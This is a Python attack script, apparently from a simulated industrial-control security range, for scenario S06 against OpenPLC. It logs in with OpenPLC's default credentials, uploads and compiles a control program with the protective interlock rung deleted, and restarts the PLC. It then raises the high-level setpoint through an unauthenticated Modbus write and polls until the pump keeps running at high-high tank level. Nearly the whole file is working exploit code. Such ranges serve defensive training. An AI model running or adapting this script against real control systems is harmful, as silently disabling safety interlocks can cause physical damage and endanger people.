#!/usr/bin/env python3
"""S06 — Logic modification with safety disabled.

Logs into OpenPLC's web interface with its default credentials, uploads
a modified control program with the protective interlock rung deleted
(`plc/logic/cedar_hollow_s06_no_interlock.st` — identical to the real
program except for one missing IF block), compiles it, and restarts the
runtime. Rung 1 (normal pumping) and rung 3 (annunciation) are
untouched, so the plant looks and behaves completely normally under
ordinary operation.

Nothing happens immediately — that's the point. This is a latent attack:
the process has to reach the exact condition the interlock existed to
catch (tank at high-high level, pump still running, in auto mode) before
the missing protection is observable at all. To make that condition
reach within a demo timeframe without needing to wait on the plant's own
long fill cycle, this script also raises SP_LVL_HI near 100% over Modbus
— the same class of action S03 already demonstrates is unauthenticated
and unauthorised, chained here onto a PLC that no longer has a second,
independent line of defense against it.

Two separate attack surfaces, two separate default-credential problems:
OpenPLC's web interface (T0812/T0822 default credentials, T0843 Program
Download, T0889 Modify Program) and Modbus's total absence of
authentication (same as S03). ATT&CK for ICS: T0889 Modify Program,
T0843 Program Download, T0837 Loss of Protection Function, T0880 Loss of
Safety.

Simulated range only. See SECURITY.md.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

from pymodbus.client import ModbusTcpClient

from attacker.common.scope import guard
from common.pointmap import load as load_pointmap
from tools.openplc_configure import OpenPLCClient

SCENARIO = "S06 — logic modification with safety disabled"
DEFAULT_HTTP_PORT = 8080
DEFAULT_MODBUS_PORT = 502
DEFAULT_PROGRAM = str(
    Path(__file__).resolve().parent.parent / "plc" / "logic" / "cedar_hollow_s06_no_interlock.st"
)
DEFAULT_MAP = str(Path(__file__).resolve().parent.parent / "plc" / "modbus-map-openplc.yml")
# SP_LVL_HI is a program-local holding register whose index happens to
# match plc/modbus-map.yml's direct addressing even against OpenPLC (see
# plc/modbus-map-openplc.yml's own header comment on why setpoints
# generally aren't assumed to match) — confirmed via S01 recon output,
# not guessed, but still written raw rather than through the point map
# for exactly that reason.
SP_LVL_HI_INDEX = 0


class Session:
    """Thin point-map-aware wrapper, same shape as S03/S05's — but
    loaded against plc/modbus-map-openplc.yml, since this targets
    OpenPLC's own Modbus interface, not process-sim's directly."""

    def __init__(self, client: ModbusTcpClient, map_path: str) -> None:
        self.client = client
        self.pm = load_pointmap(map_path)

    def read(self, tag: str) -> bool | float:
        p = self.pm[tag]
        if p.table == "coils":
            return bool(self.client.read_coils(p.index, count=1).bits[0])
        if p.table == "discrete_inputs":
            return bool(self.client.read_discrete_inputs(p.index, count=1).bits[0])
        if p.table == "input_registers":
            return p.decode(self.client.read_input_registers(p.index, count=1).registers[0])
        raise ValueError(p.table)


def run(  # noqa: PLR0913 -- mirrors S03/S05's parameter shape, plus the second (HTTP) target
    host: str,
    http_port: int,
    modbus_port: int,
    program: str,
    username: str,
    password: str,
    timeout_s: float,
    poll_s: float,
    map_path: str,
) -> int:
    http_target = guard(host, http_port, SCENARIO)
    modbus_target = guard(host, modbus_port, SCENARIO)

    print(f"[*] logging into OpenPLC at http://{http_target.connect_host}:{http_target.port}")
    plc = OpenPLCClient(f"http://{http_target.connect_host}:{http_target.port}")
    plc.login(username, password)

    print(f"[*] uploading {Path(program).name} — identical to the real program, minus the")
    print("    protective interlock rung")
    plc.upload_and_compile(program, name="S06 attack payload")
    print("[*] compiled. restarting the runtime with the modified program")
    plc.start_plc()

    client = ModbusTcpClient(modbus_target.connect_host, port=modbus_target.port)
    if not client.connect():
        print(f"[!] could not connect to {modbus_target.connect_host}:{modbus_target.port}")
        return 1

    session = Session(client, map_path)
    try:
        print("[*] raising SP_LVL_HI to 99.90% over Modbus — same unauthenticated write S03")
        print("    uses, now landing on a PLC with no independent line of defense left")
        client.write_register(SP_LVL_HI_INDEX, 9990)

        print("[*] watching for the interlock's absence — this is a latent condition, it")
        print(
            f"    only shows once the tank actually reaches high-high level "
            f"(up to {timeout_s:.0f}s)..."
        )
        deadline = time.time() + timeout_s
        started = time.time()
        max_level_while_running = 0.0
        interlock_absence_confirmed = False

        while time.time() < deadline:
            level = session.read("LT_101")
            running = session.read("P101_RUN")
            lshh = session.read("LSHH_101")
            alarm = session.read("ALARM_HORN")
            elapsed = time.time() - started

            if running:
                max_level_while_running = max(max_level_while_running, level)

            print(
                f"  [{elapsed:6.1f}s] LT_101={level:5.1f}%  P101_RUN={running}  "
                f"LSHH_101={lshh}  ALARM_HORN={alarm}"
            )

            if lshh and running:
                interlock_absence_confirmed = True
                print(
                    f"\n[+] interlock absence confirmed at {elapsed:.1f}s: LSHH_101 "
                    "(hardwired high-high) is tripped and the pump is STILL RUNNING —"
                )
                print(
                    "    the same physical condition that test_interlock_fires_"
                    "independently_of_hi_setpoint proves rung 2 stops, on the real program."
                )
                break
            time.sleep(poll_s)

        print("\n[+] impact summary")
        print(f"    highest level observed while pump was running : {max_level_while_running:.1f}%")
        print(f"    interlock absence confirmed                    : {interlock_absence_confirmed}")
        print(
            "\n[i] Rung 3 (annunciation) is untouched by the swap — ALARM_HORN still\n"
            "    fires. The operator gets a warning. They just no longer get the\n"
            "    automatic protective action that used to come with it. A code review\n"
            "    that only diffs behavior, not logic, would miss this entirely: the\n"
            "    plant looks and sounds exactly like it's supposed to, right up until\n"
            "    the one condition that was never supposed to be reachable."
        )
        if not interlock_absence_confirmed:
            print(
                "\n[i] Didn't reach high-high level within the timeout — this is a latent\n"
                "    attack, not a triggered one. Re-run with a longer --timeout, or start\n"
                "    from a lower tank level (`make down && make up`) so rung 1's own"
                "\n    auto-fill logic reaches high-high sooner."
            )
        return 0 if interlock_absence_confirmed else 1
    finally:
        client.close()


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--http-port", type=int, default=DEFAULT_HTTP_PORT)
    parser.add_argument("--modbus-port", type=int, default=DEFAULT_MODBUS_PORT)
    parser.add_argument("--program", default=DEFAULT_PROGRAM)
    parser.add_argument("--username", default="openplc")
    parser.add_argument("--password", default="openplc")
    parser.add_argument(
        "--timeout", type=float, default=300.0, help="Give up after this many seconds"
    )
    parser.add_argument("--poll", type=float, default=3.0, help="Seconds between status polls")
    parser.add_argument("--map", default=DEFAULT_MAP, help="Point map for OpenPLC's addressing")
    return parser.parse_args(argv)


def main() -> int:
    args = parse_args()
    return run(
        args.host,
        args.http_port,
        args.modbus_port,
        args.program,
        args.username,
        args.password,
        args.timeout,
        args.poll,
        args.map,
    )


if __name__ == "__main__":
    sys.exit(main())
